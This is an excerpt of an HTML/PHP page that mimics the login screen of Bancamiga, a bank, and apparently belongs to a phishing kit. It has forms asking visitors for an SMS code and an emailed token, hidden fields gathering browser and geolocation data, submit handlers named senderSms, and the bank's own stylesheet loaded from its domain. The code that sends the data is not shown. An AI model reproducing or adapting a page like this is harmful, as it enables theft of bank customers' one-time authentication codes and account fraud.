...
<html>
  <head>
    ...
    <!-- CSS -->
    <link rel="stylesheet" type="text/css" href="bootstrap-5.3.3-dist/css/bootstrap.min.css?MT<?= $Microtime; ?>">
    <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" type="text/css" media="screen" href="https://online.bancamiga.com/css/bancamiga.css?V=1.2.4?MT">
    <style>.ErrInput{ border:1px solid #FF0000 !important; }</style>
  </head>

  <input id="Host" type="hidden" value="" />
...
.input {
    ...
    100% { transform: rotate(360deg); }
                    ...
                    <div class="card-login"> 
                        <form onsubmit="javascript:return senderSms();" style="display: none;" id="frmLoginPersonal" name="frmLoginPersonal" method="post" >
                            ...
                            <input required style="width: 90%;" type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="SMS" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="SMS">
                            <div class="clearfix"></div>
...
Firma digital
                        ...
                        <form style="display: none;" id="frmLoginPersonal2" name="frmLoginPersonal" method="post" style="display:block">
                            <input type="hidden" name="navegador" value="" id="hNavegador">
                            <input type="hidden" name="tipoAmbiente" value="P" id="hAmbiente">
                            <input type="hidden" name="longitud" value="" id="Plongitud">
                            <input type="hidden" name="latitud" value="" id="Platitud">
                            ...
                            <div id="message_areaOTP">
                                <div class="message errormsg" id="errorMsg" align="center" style="display: none; width:86%; margin-left: auto; margin-right: auto;font-size: 18px; color: #bd3543;"></div>
                            </div><p class="card-link" style="text-align: center;">Ingresa el codigo Token enviado a tu correo.</p>
                            <input style="width: 90%;" type="text" name="identificacion" maxlength="30" value="" tabindex="1" id="SMS" class="user-login" onkeypress="return acceptNum(event);" autocomplete="off" placeholder="Token">
                            <div class="clearfix"></div>
                            ...
                            <input type="button" onclick="senderSms1();" class="btn_actualizar" value="Continuar" id="btnValidasr">
                            <div style=" text-align: center;">
                                <a class="card-link" onclick="modalRequest();" href="javascript:void(0);">¿Olvidó
                                                                                                          su
                                                                                                          contraseña?</a>
